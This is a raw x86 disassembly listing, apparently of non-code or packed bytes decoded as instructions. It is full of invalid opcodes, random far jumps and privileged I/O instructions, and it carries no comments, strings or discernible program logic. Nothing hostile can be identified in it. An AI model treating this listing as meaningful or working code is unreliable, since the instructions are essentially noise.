  4254de:	fcomp  DWORD PTR [edx]
  4254e1:	add    edi,eax
  4254e3:	lods   al,BYTE PTR ds:[esi]
  4254e4:	pop    edi
  4254e5:	das    
  4254e6:	addr16 nop
  4254e8:	add    DWORD PTR [eax],eax
  4254ea:	add    BYTE PTR [ecx],al
  4254ec:	add    BYTE PTR [eax],al
  4254ee:	fst    DWORD PTR [esp+eiz*2-0x8]
  4254f2:	fwait
  4254f3:	rcr    DWORD PTR [ebx+eiz*8-0x25],0x78
  4254f8:	ins    BYTE PTR es:[edi],dx
  4254f9:	sub    BYTE PTR [ebx+0x1713ab3c],dh
  4254ff:	lods   al,BYTE PTR ds:[esi]
  425500:	mov    bh,0x29
  425502:	sub    DWORD PTR [edi+0x5401bde0],edi
  425508:	mov    ebx,0xe2f097d6
  42550d:	add    BYTE PTR [eax+0x52],bh
  425510:	and    BYTE PTR [ebp+0x30a51454],0x44
  425517:	mov    esp,0xbf1a9d5b
  42551c:	cdq    
  42551d:	mov    eax,ds:0x61e79da6
  425522:	xchg   DWORD PTR [ecx+0x44],ecx
  425525:	fisttp DWORD PTR ds:0xb0a004a0
  42552b:	loopne 0x4254c1
  42552d:	das    
  42552e:	pop    es
  42552f:	or     esi,DWORD PTR [edi+0x35f730e9]
  425535:	repnz (bad)
  425539:	cmp    DWORD PTR [ebp-0x7f],ebx
  42553c:	pop    ds
  42553d:	jno    0x42558c
  42553f:	btr    eax,edx
  425542:	mov    al,0xd
  425544:	xchg   esi,eax
  425545:	bound  ebp,QWORD PTR [bp+si-0x7]
  425549:	in     eax,dx
  42554a:	add    ah,BYTE PTR [ecx-0x1d]
  42554d:	dec    edx
  42554e:	dec    ecx
  42554f:	fchs   
  425551:	mov    ds:0x52b6da0e,al
  425556:	sbb    BYTE PTR [eax],ah
  425558:	or     BYTE PTR [ebp+0x76],dh
  42555b:	push   0xffffffd9
  42555d:	fild   QWORD PTR [ecx-0x37]
  425560:	and    eax,0xcb808dd8
  425565:	mov    dl,0x82
  425567:	out    dx,al
  425568:	out    0xd0,al
  42556a:	sub    BYTE PTR [eax-0x34],ah
  42556d:	jecxz  0x42559a
  42556f:	cmp    BYTE PTR [edx+0x49724078],al
  425575:	imul   esi,DWORD PTR [ebx],0xa0e5a6bb
  42557b:	push   0x94c80221
  425580:	popa   
  425581:	dec    edi
  425582:	test   BYTE PTR [edx+0x78],cl
  425585:	adc    esp,DWORD PTR [edx-0x9]
  425588:	mov    BYTE PTR [eax-0x5],dl
  42558b:	and    eax,0x43aad12f
  425590:	gs cmp al,0xbf
  425593:	mov    al,ds:0x8ab0d0d
  425598:	dec    ebp
  425599:	push   ecx
  42559a:	sub    edi,0x91a6fbb2
  4255a0:	dec    ebx
  4255a1:	and    al,0xfb
  4255a3:	pop    ds
  4255a4:	xchg   edi,eax
  4255a5:	jg     0x4255a9
  4255a7:	test   BYTE PTR [ecx],ah
  4255a9:	mov    ebx,0x42634f99
  4255ae:	ret    0xa94c
  4255b1:	mov    edi,0x31d99b69
  4255b6:	xor    al,bl
  4255b8:	cmp    bl,bl
  4255ba:	mov    edx,0x3375511e
  4255bf:	dec    ecx
  4255c0:	jl     0x4255d0
  4255c2:	and    al,0xb8
  4255c4:	into   
  4255c5:	inc    ebx
  4255c6:	in     al,dx
  4255c7:	mov    WORD PTR [esi+edx*4+0x2756be48],ss
  4255ce:	sar    BYTE PTR [edx-0x54],0xd2
  4255d2:	xchg   ecx,eax
  4255d3:	arpl   sp,dx
  4255d5:	scas   ax,WORD PTR es:[edi]
  4255d7:	or     BYTE PTR [esi*8+0x2222426a],ah
  4255de:	and    al,0x31
  4255e0:	cmp    al,BYTE PTR [eax+edx*8+0x2b]
  4255e4:	repz in al,0x3
  4255e7:	scas   eax,DWORD PTR es:[edi]
  4255e8:	adc    BYTE PTR [edx-0x103bae97],ch
	...
  425656:	(bad)  
  425657:	jmp    0xfef4:0xfe6e7a4e
  42565e:	dec    ebp
  42565f:	mov    esi,0x1525f13a
  425664:	rcr    BYTE PTR [ecx+0x67],1
  425667:	xchg   ecx,eax
  425668:	add    DWORD PTR [eax],eax
  42566a:	add    BYTE PTR [ecx],al
  42566c:	add    BYTE PTR [eax],al
  42566e:	add    al,0x47
  425670:	cmp    ebx,DWORD PTR [edx+ebx*1]
  425673:	or     eax,0x46a2351b
  425678:	adc    BYTE PTR [ecx+0x6],ah
  42567b:	sbb    eax,0x83285cd9
  425680:	int3   
  425681:	dec    edx
  425682:	cmp    al,BYTE PTR [ebx+0x5a]
  425685:	jmp    0xefb4f8c3
  42568a:	push   cs
  42568b:	sti    
  42568c:	dec    edi
  42568d:	jbe    0x425682
  42568f:	xchg   dh,cl
  425691:	fdiv   QWORD PTR [edi]
  425693:	lea    ecx,[edx+edx*4]
  425696:	(bad)  
  425697:	mov    bl,0x4
  425699:	aad    0xf
  42569b:	loopne 0x425703
  42569d:	shl    DWORD PTR [ebp+0x41],cl
  4256a0:	outs   dx,BYTE PTR ds:[esi]
  4256a1:	xchg   esp,eax
  4256a2:	xchg   ecx,edi
  4256a4:	rol    esi,1
  4256a6:	ret    
  4256a7:	sbb    DWORD PTR [edx-0x52272272],ebp
  4256ad:	js     0x42569b
  4256af:	shr    DWORD PTR [edi+0x11e900bc],0x9b
  4256b6:	scas   eax,DWORD PTR es:[edi]
  4256b7:	adc    eax,0xc43f7fb0
  4256bc:	fcmovnbe st,st(2)
  4256be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256bf:	outs   dx,DWORD PTR ds:[esi]
  4256c0:	push   edx
  4256c1:	xchg   ebx,eax
  4256c2:	aad    0x32
  4256c4:	leave  
  4256c5:	and    esp,esp
  4256c7:	repnz stos DWORD PTR es:[edi],eax
  4256c9:	imul   edx,DWORD PTR [ebx],0xf7cc3d9d
  4256cf:	daa    
  4256d0:	sub    bl,BYTE PTR [ecx+0x54]
  4256d3:	jno    0x42566a
  4256d5:	mov    ch,0x2
  4256d7:	dec    esi
  4256d8:	xchg   DWORD PTR [ebx-0xb4f157d],edi
  4256de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256df:	bound  eax,QWORD PTR [ebp*4+0x7557b30d]
  4256e6:	push   edx
  4256e7:	mov    ds:0xbfcbc241,al
  4256ec:	mov    cl,0x56
  4256ee:	ins    DWORD PTR es:[edi],dx
  4256ef:	jae    0x4256ad
  4256f1:	mov    ecx,0x2e6985ca
  4256f6:	dec    eax
  4256f7:	lods   eax,DWORD PTR ds:[esi]
  4256f8:	jmp    esi
  4256fa:	jmp    0x8cae7360
  4256ff:	fmul   QWORD PTR [eax+edi*8]
  425702:	enter  0x7379,0xd1
  425706:	inc    ecx
  425707:	sbb    esp,esp
  425709:	add    eax,0x9e258957
  42570e:	cmp    DWORD PTR [esi-0x796cbec0],edx
  425714:	jmp    edi
  425716:	jl     0x4256e6
  425718:	inc    ebp
  425719:	jae    0x425790
  42571b:	or     BYTE PTR [ecx+0x3e],0x12
  42571f:	mul    BYTE PTR [ebx]
  425721:	push   ebx
  425722:	jp     0x4256c8
  425724:	ror    edi,0x86
  425727:	mov    ds:0xb6850e12,al
  42572c:	mov    ecx,ebx
  42572e:	mov    esp,0x655b9322
  425733:	lods   eax,DWORD PTR ds:[esi]
  425734:	jnp    0x425758
  425736:	sub    DWORD PTR [edx+0x4],esi
  425739:	mov    cl,0x3e
  42573b:	jle    0x42571d
  42573d:	ins    DWORD PTR es:[edi],dx
  42573e:	ja     0x425700
  425740:	pop    ds
  425741:	gs inc bl
  425744:	xor    DWORD PTR [edx-0x4537a246],ecx
  42574a:	aas    
  42574b:	xchg   esi,eax
  42574c:	sub    ebp,DWORD PTR [eax]
  42574e:	nop
  42574f:	ds inc bp
  425752:	imul   eax,DWORD PTR [esp+eax*2+0x63c6ada5],0x98339313
  42575d:	les    eax,FWORD PTR [ebx+ecx*8+0xf]
  425761:	shl    esi,1
  425763:	mov    ecx,0x85ce484
  425768:	stc    
  425769:	dec    edx
  42576a:	cdq    
  42576b:	cmc    
  42576c:	rcr    DWORD PTR [esi+0x0],cl
	...
  4257d3:	add    BYTE PTR [eax],al
  4257d5:	add    dh,dl
  4257d7:	aaa    
  4257d8:	shl    BYTE PTR [ebx+esi*8],cl
  4257db:	cmc    
  4257dc:	div    bh
  4257de:	test   DWORD PTR [edi+0x3f],0x379ba274
  4257e5:	mov    esp,0x19267
  4257ea:	add    BYTE PTR [ecx],al
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	(bad)  
  4257ef:	loope  0x42579d
  4257f1:	inc    eax
  4257f2:	cwde   
  4257f3:	loope  0x425844
  4257f5:	or     DWORD PTR [esi],ebx
  4257f7:	test   eax,0x5013f054
  4257fc:	data16 fbld TBYTE PTR [ecx-0x4b1a3364]
  425803:	xchg   ebx,eax
  425804:	hlt    
  425805:	lock sbb eax,edi
  425808:	pop    ebp
  425809:	ficom  DWORD PTR ds:0xc14be942
  42580f:	in     eax,0x5b
  425811:	(bad)  
  425812:	rcl    DWORD PTR [edx],cl
  425814:	pop    es
  425815:	ret    
  425816:	arpl   WORD PTR [esi],di
  425818:	xor    eax,DWORD PTR [ebx]
  42581a:	jmp    0x425861
  42581c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42581d:	cdq    
  42581e:	xor    BYTE PTR [eax-0x280ca227],bh
  425824:	pop    ds
  425825:	mov    bl,0xc
  425827:	shr    esp,1
  425829:	inc    edx
  42582a:	lock cwde 
  42582c:	adc    dl,0xb1
  42582f:	pop    edx
  425830:	inc    esp
  425831:	lods   al,BYTE PTR ds:[esi]
  425832:	rol    BYTE PTR [ebp-0x5d],0xdf
  425836:	xor    al,0x9d
  425838:	mov    ebx,0x19ecbc0b
  42583d:	jbe    0x4258b4
  42583f:	mov    esp,0x40668c32
  425844:	mov    dh,0xf5
  425846:	adc    ebp,DWORD PTR [ebp-0x32]
  425849:	mov    cl,0x7f
  42584b:	and    BYTE PTR ds:0x30f0c797,dl
  425851:	cmp    ebp,esi
  425853:	sbb    eax,0x289f10e6
  425858:	ins    BYTE PTR es:[edi],dx
  425859:	imul   ebx,DWORD PTR [edx-0x2a17b7cf],0xd3af8deb
  425863:	dec    edx
  425864:	push   ds
  425865:	dec    ebp
  425866:	mov    BYTE PTR [ecx+0x23ac00b],ah
  42586c:	inc    eax
  42586d:	mov    ah,0xd
  42586f:	shl    DWORD PTR [ebp+0x2e7f9a47],1
  425875:	aam    0x72
  425877:	cmc    
  425878:	mov    BYTE PTR [ecx],al
  42587a:	cmp    eax,0xcc5d5121
  42587f:	out    0x9,al
  425881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425882:	stos   BYTE PTR es:[edi],al
  425883:	adc    ecx,esi
  425885:	push   esp
  425886:	fstp   QWORD PTR [edx-0x47]
  425889:	adc    edx,DWORD PTR [esi-0x4cf8fc27]
  42588f:	fnstcw WORD PTR [ebx-0x45]
  425892:	fisubr DWORD PTR [eax]
  425894:	jnp    0x4258fb
  425896:	repz sbb eax,0xe545c239
  42589c:	in     al,dx
  42589d:	cwde   
  42589e:	popa   
  42589f:	push   edi
  4258a0:	lods   eax,DWORD PTR ds:[esi]
  4258a1:	aam    0x99
  4258a3:	ins    BYTE PTR es:[edi],dx
  4258a4:	arpl   WORD PTR [eax+0x69],di
  4258a7:	pop    eax
  4258a8:	add    BYTE PTR [esi+0xe],ah
  4258ab:	ins    BYTE PTR es:[edi],dx
  4258ac:	jmp    0xa283816c
  4258b1:	xchg   edi,eax
  4258b2:	out    0x5a,eax
  4258b4:	xor    BYTE PTR [edx],ch
  4258b6:	ins    BYTE PTR es:[edi],dx
  4258b7:	repnz fist DWORD PTR [ecx+ebp*4+0x6f]
  4258bc:	aas    
  4258bd:	cmp    eax,edx
  4258bf:	and    edi,ebx
  4258c1:	add    DWORD PTR [edi+0x56664303],ebx
  4258c7:	lds    eax,FWORD PTR [edx-0x52d352cf]
  4258cd:	ror    DWORD PTR [ebx-0x75],cl
  4258d0:	bound  edi,QWORD PTR [esi]
  4258d2:	(bad)  
  4258d3:	jnp    0x4258b9
  4258d5:	and    BYTE PTR [esi+edi*1-0xe],0x9
  4258da:	jbe    0x425887
  4258dc:	int3   
  4258dd:	jne    0x42587c
  4258df:	jge    0x425880
  4258e1:	mov    edx,edi
  4258e3:	sar    BYTE PTR [edi+0x4ab072ad],cl
  4258e9:	cmp    eax,0xe888497
	...
  425956:	pop    esp
  425957:	push   edx
  425958:	nop
  425959:	push   edx
  42595a:	sahf   
  42595b:	rcr    dh,cl
  42595d:	pop    esi
  42595e:	adc    BYTE PTR [edx+0x55],0x71
  425962:	sbb    al,0xce
  425964:	mov    bl,0x52
  425966:	addr16 xchg ebx,eax
  425968:	add    DWORD PTR [eax],eax
  42596a:	add    BYTE PTR [ecx],al
  42596c:	add    BYTE PTR [eax],al
  42596e:	mov    cl,0x2c
  425970:	dec    esp
  425971:	xchg   esp,eax
  425972:	push   0xffffffa7
  425974:	ror    BYTE PTR [ebx-0x32c3b98c],1
  42597a:	cmp    edx,DWORD PTR [edx+0x1]
  42597d:	fstp   QWORD PTR [ebx]
  42597f:	scas   eax,DWORD PTR es:[edi]
  425980:	test   DWORD PTR [edi-0x48],esp
  425983:	add    edx,DWORD PTR [ecx+ecx*4+0x1a]
  425987:	(bad)
  42598a:	mov    ds:0x20cd18f0,eax
  42598f:	test   DWORD PTR [edi+0x6cbc6ff2],eax
  425995:	daa    
  425996:	out    dx,eax
  425997:	mov    WORD PTR ds:0xb91753e2,cs
  42599d:	test   DWORD PTR [edi+0x14],ebp
  4259a0:	jecxz  0x4259de
  4259a2:	mov    edi,0x38a4103b
  4259a7:	nop
  4259a8:	ja     0x4259d7
  4259aa:	scas   al,BYTE PTR es:[edi]
  4259ab:	pop    edx
  4259ac:	push   0xfffffff2
  4259ae:	in     eax,0x8f
  4259b0:	push   ebp
  4259b1:	(bad)  
  4259b2:	or     DWORD PTR ds:0xffd3de13,ecx
  4259b8:	and    DWORD PTR [ebx],edx
  4259ba:	dec    ebx
  4259bb:	mov    al,0x98
  4259bd:	inc    esp
  4259be:	sub    BYTE PTR [ebp-0x13],bh
  4259c1:	jno    0x4259c6
  4259c3:	into   
  4259c4:	ror    DWORD PTR [eax],cl
  4259c6:	int3   
  4259c7:	fisttp DWORD PTR [edi]
  4259c9:	(bad)  
  4259ca:	ss adc eax,0x98c13a6
  4259d0:	sti    
  4259d1:	enter  0xd8f1,0xd2
  4259d5:	repnz les esi,FWORD PTR [ebp+eax*8+0x2d]
  4259da:	push   edi
  4259db:	retf   
  4259dc:	xlat   BYTE PTR ds:[ebx]
  4259dd:	xchg   ebp,eax
  4259de:	push   ebx
  4259df:	mov    edi,0x260d83af
  4259e4:	call   0x7d28121d
  4259e9:	sbb    cl,BYTE PTR [edi]
  4259eb:	mov    BYTE PTR [esi*1+0x3564bf20],bh
  4259f2:	cdq    
  4259f3:	cmp    eax,0x342fad4e
  4259f8:	int    0x77
  4259fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259fb:	imul   edx,DWORD PTR [esi-0x2213264e],0x8a57ce7e
  425a05:	mov    esp,DWORD PTR [eax]
  425a07:	fisttp QWORD PTR [ebx-0x35815d7c]
  425a0d:	xor    bl,dh
  425a0f:	and    eax,0x6f59ed14
  425a14:	and    DWORD PTR [esi],0x1c19e697
  425a1a:	sbb    DWORD PTR [edi+0x775bdae],esp
  425a20:	loopne 0x425a98
  425a22:	fdivr  st(3),st
  425a24:	fchs   
  425a26:	sbb    al,bl
  425a28:	jb     0x425a55
  425a2a:	mov    bl,0x4f
  425a2c:	outs   dx,BYTE PTR ds:[esi]
  425a2d:	test   al,0xe5
  425a2f:	pop    ds
  425a30:	push   ss
  425a31:	fidiv  DWORD PTR [ebx-0x42a6524c]
  425a37:	lea    eax,[ebx]
  425a39:	jns    0x4259bc
  425a3b:	jle    0x425a50
  425a3d:	retf   0x3833
  425a40:	fdivr  DWORD PTR [eax]
  425a42:	pop    ecx
  425a43:	fsubrp st(0),st
  425a45:	and    eax,0x961e2951
  425a4a:	clc    
  425a4b:	pop    eax
  425a4c:	test   eax,0x7a03c65
  425a51:	cmp    BYTE PTR [edi+edi*4],ah
  425a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a55:	or     ecx,DWORD PTR [ebx+edi*1-0x3d84134c]
  425a5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a5d:	dec    edi
  425a5e:	js     0x425a0d
  425a60:	jg     0x425a0e
  425a62:	push   ebp
  425a63:	mov    al,ds:0x9a891283
  425a68:	xor    BYTE PTR cs:[ecx],dl
  425a6b:	mov    esi,0x4ba8
	...
  425ad4:	add    BYTE PTR [eax],al
  425ad6:	shl    DWORD PTR [ebx+0x4],0x67
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	jcxz   0x425ac5
  425ade:	(bad)  
  425adf:	fimul  DWORD PTR [edi+eax*4+0x5d7c1491]
  425ae6:	addr16 xchg esp,eax
  425ae8:	add    DWORD PTR [eax],eax
  425aea:	add    BYTE PTR [ecx],al
  425aec:	add    BYTE PTR [eax],al
  425aee:	ja     0x425ad9
  425af0:	push   eax
  425af1:	jnp    0x425af1
  425af3:	mov    edx,0xab307131
  425af8:	jle    0x425ab9
  425afa:	mov    WORD PTR [ebx+0x3b],fs
  425afd:	sub    BYTE PTR [ecx],al
  425aff:	xchg   edi,eax
  425b00:	cmp    eax,0xf1e66ea8
  425b05:	xor    cl,dh
  425b07:	in     al,dx
  425b08:	sub    DWORD PTR [edi-0x24],esp
  425b0b:	xchg   esi,eax
  425b0c:	push   eax
  425b0d:	push   ds
  425b0e:	stos   DWORD PTR es:[edi],eax
  425b0f:	inc    ebp
  425b10:	ins    DWORD PTR es:[edi],dx
  425b11:	jmp    0xa7a8:0xa02c292e
  425b18:	cdq    
  425b19:	mov    ?,WORD PTR [edi+ebx*2+0x517ea621]
  425b20:	out    0xb6,eax
  425b22:	mov    al,ds:0x77bb7622
  425b27:	jb     0x425ade
  425b29:	fcmovne st,st(4)
  425b2b:	jp     0x425b06
  425b2d:	iret   
  425b2e:	xchg   edx,eax
  425b2f:	push   ebx
  425b30:	lock lock scas eax,DWORD PTR es:[edi]
  425b33:	jnp    0x425b4d
  425b35:	in     eax,0x78
  425b37:	xchg   ebx,eax
  425b38:	cmc    
  425b39:	sti    
  425b3a:	add    edx,esi
  425b3c:	push   0xffffffee
  425b3e:	shl    BYTE PTR [esi-0x795d39f2],0x6d
  425b45:	aas    
  425b46:	inc    ebp
  425b47:	lods   al,BYTE PTR ds:[esi]
  425b48:	pop    edx
  425b49:	test   eax,0x3f897c22
  425b4e:	hlt    
  425b4f:	mov    edx,0xea111161
  425b54:	add    esi,0x415903a0
  425b5a:	jmp    0xb9a0:0x9305df1d
  425b61:	rcr    DWORD PTR [ecx+0x62b0071b],0x33
  425b68:	ss ror ah,cl
  425b6b:	lods   eax,DWORD PTR ds:[esi]
  425b6c:	xchg   edx,eax
  425b6d:	adc    BYTE PTR [ecx],dl
  425b6f:	mov    edx,0x7698bfc7
  425b74:	mov    ss,edx
  425b76:	xor    eax,0xb66c417b
  425b7b:	jmp    0x51ca:0x57583778
  425b82:	cmp    ah,BYTE PTR [esi-0x5d]
  425b85:	mov    WORD PTR [edi],cs
  425b87:	sub    ch,BYTE PTR [edi+0x66]
  425b8a:	sbb    eax,DWORD PTR [ebp+0x68001a8b]
  425b90:	fbstp  TBYTE PTR [edi+eiz*4-0xf]
  425b94:	std    
  425b95:	cmp    BYTE PTR [esp+edi*8+0x5d],ch
  425b99:	sub    ah,0x91
  425b9c:	fnstenv [edi-0x2b]
  425b9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ba0:	rcr    DWORD PTR [ebx+0x35],1
  425ba3:	push   0xffffffe7
  425ba5:	aaa    
  425ba6:	sbb    al,0xd0
  425ba8:	mov    ah,BYTE PTR [ebp-0x11]
  425bab:	sub    eax,0xba5b30e5
  425bb0:	xor    eax,0x2e891166
  425bb5:	das    
  425bb6:	xor    bl,BYTE PTR [esi]
  425bb8:	xor    esi,ebp
  425bba:	clc    
  425bbb:	sub    cl,BYTE PTR ds:0x9fe5c968
  425bc1:	cs aaa 
  425bc3:	stos   DWORD PTR es:[edi],eax
  425bc4:	loopne 0x425b6d
  425bc6:	enter  0x70f4,0xf8
  425bca:	fistp  DWORD PTR [edi+0x681cd20a]
  425bd0:	shl    BYTE PTR [ebx+0x5de7e2cb],cl
  425bd6:	imul   edx,edi,0x62207fc1
  425bdc:	jmp    0x9221eb9c
  425be1:	mov    cl,0xeb
  425be3:	ror    ebx,0x59
  425be6:	in     eax,dx
  425be7:	jmp    0x401e103a
  425bec:	xor    BYTE PTR [eax+0x0],dl
	...
  425c56:	(bad)  
  425c57:	clc    
  425c58:	jnp    0x425cb0
  425c5a:	jg     0x425c33
  425c5c:	in     eax,dx
  425c5d:	cli    
  425c5e:	enter  0xe6cd,0x96
  425c62:	das    
  425c63:	aam    0x23
  425c65:	popf   
  425c66:	addr16 xchg ebp,eax
  425c68:	add    DWORD PTR [eax],eax
  425c6a:	add    BYTE PTR [ecx],al
  425c6c:	add    BYTE PTR [eax],al
  425c6e:	pop    ebx
  425c6f:	out    dx,eax
  425c70:	jmp    0xb9ab:0x7dab4912
  425c77:	mov    dl,0xbc
  425c79:	mov    esp,0xdda6f077
  425c7e:	out    dx,eax
  425c7f:	dec    ebp
  425c80:	sti    
  425c81:	inc    ebx
  425c82:	or     bl,bh
  425c84:	pusha  
  425c85:	cmp    BYTE PTR [edx-0x7],0xb3
  425c89:	mov    ah,0xd3
  425c8b:	and    edx,ebx
  425c8d:	jmp    0x8005804f
  425c92:	mov    ecx,0xcb0b99ae
  425c97:	sar    DWORD PTR [ebp-0x67309472],1
  425c9d:	idiv   DWORD PTR [ebx+0x270fe45f]
  425ca3:	(bad)  
  425ca4:	sti    
  425ca5:	mov    ecx,0x7aa68f27
  425caa:	icebp  
  425cab:	add    ebp,DWORD PTR [ecx+0x705f7734]
  425cb1:	push   esi
  425cb2:	cmp    al,0xa3
  425cb4:	mov    dl,0xd
  425cb6:	dec    esi
  425cb7:	pop    ebp
  425cb8:	dec    eax
  425cb9:	xchg   esi,eax
  425cba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425cbb:	jl     0x425cfc
  425cbd:	mov    edi,0x176ad420
  425cc2:	inc    edi
  425cc3:	mov    dh,0x7
  425cc5:	shl    bl,cl
  425cc7:	jmp    0x18dc:0x3e891900
  425cce:	repz cli 
  425cd0:	push   es
  425cd1:	retf   0xbfb3
  425cd4:	mov    ds:0xf1f50aa4,al
  425cd9:	pusha  
  425cda:	add    bh,BYTE PTR [ebx+0x16]
  425cdd:	shl    bh,cl
  425cdf:	xor    eax,DWORD PTR [ebx-0x31787be7]
  425ce5:	(bad)  
  425ce7:	rol    BYTE PTR [ebx],1
  425ce9:	fist   WORD PTR [edi+0x3a]
  425cec:	ret    0x7bba
  425cef:	into   
  425cf0:	test   dh,ch
  425cf2:	sub    BYTE PTR [esi],al
  425cf4:	xor    al,0x4a
  425cf6:	shr    ah,cl
  425cf8:	and    ch,BYTE PTR [eax-0x18]
  425cfb:	pop    ebp
  425cfc:	outs   dx,BYTE PTR ds:[esi]
  425cfd:	lods   al,BYTE PTR ds:[esi]
  425cfe:	fimul  WORD PTR [esi+esi*4]
  425d01:	dec    edi
  425d02:	jnp    0x425d44
  425d04:	inc    eax
  425d05:	loope  0x425d82
  425d07:	jl     0x425d4d
  425d09:	jg     0x425ca7
  425d0b:	cs push cs
  425d0d:	call   0x8a57:0x85b9aab6
  425d14:	stos   DWORD PTR es:[edi],eax
  425d15:	pop    ss
  425d16:	mov    al,ds:0xcecbbae0
  425d1b:	dec    edi
  425d1c:	fsub   st,st(2)
  425d1e:	scas   al,BYTE PTR es:[edi]
  425d1f:	cs in  al,dx
  425d21:	mov    ah,BYTE PTR [edx-0x743e8798]
  425d27:	or     bl,BYTE PTR [esi-0x80]
  425d2a:	je     0x425d1b
  425d2c:	repz popa 
  425d2e:	dec    esp
  425d2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d30:	cld    
  425d31:	jb     0x425d88
  425d33:	imul   esi,eax,0x19
  425d36:	sbb    ah,dh
  425d38:	and    eax,0x18f1f750
  425d3d:	call   0xae46:0xbc8ead6e
  425d44:	inc    ecx
  425d45:	jne    0x425ceb
  425d47:	lods   al,BYTE PTR ds:[esi]
  425d48:	xchg   ebx,eax
  425d49:	ret    
  425d4a:	fistp  DWORD PTR [edi]
  425d4c:	outs   dx,BYTE PTR ds:[esi]
  425d4d:	push   ecx
  425d4e:	dec    BYTE PTR [edi+0x7e]
  425d51:	repz jl 0x425d5d
  425d54:	pusha  
  425d55:	xchg   esi,eax
  425d56:	xor    DWORD PTR [ebx],ebp
  425d58:	sbb    al,0x26
  425d5a:	fwait
  425d5b:	js     0x425dc4
  425d5d:	jl     0x425cf5
  425d5f:	mov    ds:0xefda5f02,eax
  425d64:	sbb    eax,0xab62b0eb
  425d69:	xor    al,0xff
  425d6b:	xor    DWORD PTR [ecx+0x88],0x0
	...
  425dd5:	add    bh,bh
  425dd7:	lods   al,BYTE PTR ds:[esi]
  425dd8:	fadd   QWORD PTR [edi]
  425dda:	fbstp  TBYTE PTR [edi-0x1]
  425ddd:	cld    
  425dde:	gs addr16 stc 
  425de1:	mov    ds:0xd34651c5,al
  425de6:	addr16 xchg esi,eax
  425de8:	add    DWORD PTR [eax],eax
  425dea:	add    BYTE PTR [ecx],al
  425dec:	add    BYTE PTR [eax],al
  425dee:	add    al,0x3d
  425df0:	mov    bl,0xac
  425df2:	(bad)  
  425df4:	dec    ebx
  425df5:	mov    al,0x8c
  425df7:	mov    ds:0xb9fff027,eax
  425dfc:	out    0xd6,al
  425dfe:	and    al,0x84
  425e00:	out    0x6,al
  425e02:	push   esi
  425e03:	std    
  425e04:	fbld   TBYTE PTR [edi-0x48706848]
  425e0a:	retf   0xab08
  425e0d:	imul   ecx,DWORD PTR [ecx+0x2859374a],0xffffffbc
  425e14:	daa    
  425e15:	add    eax,0x13d0fdba
  425e1a:	add    esp,DWORD PTR ds:0xc5a87217
  425e20:	(bad)  
  425e21:	cld    
  425e22:	stc    
  425e23:	call   0x4703d843
  425e28:	aaa    
  425e29:	fdivr  DWORD PTR [edx-0x7909e8ab]
  425e2f:	mov    ebx,0x95392ed8
  425e34:	inc    edi
  425e35:	or     DWORD PTR [edi+eax*8+0x75],edx
  425e39:	std    
  425e3a:	mov    bh,0x96
  425e3c:	int3   
  425e3d:	lahf   
  425e3e:	dec    eax
  425e3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e40:	test   BYTE PTR [eax+0x3b],dh
  425e43:	mov    esi,0xc1d797e8
  425e48:	addr16 pop esi
  425e4a:	(bad)  
  425e4b:	outs   dx,DWORD PTR ds:[esi]
  425e4c:	cwde   
  425e4d:	icebp  
  425e4e:	inc    ebp
  425e4f:	jmp    0x9d0f4fb3
  425e54:	mov    eax,0xe903a2a3
  425e59:	mov    ch,0xbe
  425e5b:	cmp    al,0x92
  425e5d:	dec    edx
  425e5e:	add    al,0xec
  425e60:	inc    DWORD PTR [ebp+0x327842dd]
  425e66:	imul   esi,DWORD PTR [edi+0x4e314de4],0x101fa10b
  425e70:	daa    
  425e71:	ficom  WORD PTR [ebx+0xd]
  425e74:	xor    edi,DWORD PTR [ebx]
  425e76:	aaa    
  425e77:	mov    al,ds:0xd001cb04
  425e7c:	test   ch,0x1
  425e7f:	mov    ah,BYTE PTR [ecx]
  425e81:	pop    ebp
  425e82:	daa    
  425e83:	movups xmm0,xmm3
  425e86:	sbb    eax,0xe489bde2
  425e8b:	mov    eax,0xe6c2ff19
  425e90:	mov    fs,ecx
  425e92:	aam    0x50
  425e94:	adc    eax,0xebd9a6b4
  425e99:	cs call 0xf1ab:0xe12b7304
  425ea1:	aam    0xfe
  425ea3:	jmp    0x425e85
  425ea5:	in     al,0x1f
  425ea7:	pop    ss
  425ea8:	mov    bl,0xad
  425eaa:	repnz test DWORD PTR [ecx],0xa64bb2b
  425eb1:	or     ah,cl
  425eb3:	sub    ebx,ebp
  425eb5:	jmp    0x425f35
  425eb7:	mov    ds,edi
  425eb9:	(bad)
  425ebc:	push   cs
  425ebd:	jmp    0xee7a33d0
  425ec2:	sub    eax,0xfcb549d1
  425ec7:	in     eax,dx
  425ec8:	(bad)  
  425ec9:	push   ds
  425eca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ecb:	es in  eax,0x4b
  425ece:	add    bh,cl
  425ed0:	inc    ebp
  425ed1:	mov    ebx,0xbb74fb1e
  425ed6:	call   0xcbd2ab71
  425edb:	sbb    eax,0xd3d9d617
  425ee0:	shl    BYTE PTR [edi-0x14],1
  425ee3:	outs   dx,BYTE PTR ds:[esi]
  425ee4:	dec    edi
  425ee5:	mov    dh,0xd2
  425ee8:	pushf  
  425ee9:	push   edi
  425eea:	xchg   ecx,eax
  425eeb:	push   edi
  425eec:	xchg   edi,eax
  425eed:	jecxz  0x425eef
	...
  425f53:	add    BYTE PTR [eax],al
  425f55:	add    dh,al
  425f57:	jl     0x425faa
  425f59:	sar    bl,1
  425f5b:	std    
  425f5c:	(bad)  
  425f5d:	jle    0x425f2b
  425f5f:	pop    ss
  425f60:	popf   
  425f61:	scas   eax,DWORD PTR es:[edi]
  425f62:	pop    ecx
  425f63:	push   ecx
  425f64:	sbb    BYTE PTR [edx+0x67],ch
  425f67:	xchg   edi,eax
  425f68:	add    DWORD PTR [eax],eax
  425f6a:	add    BYTE PTR [ecx],al
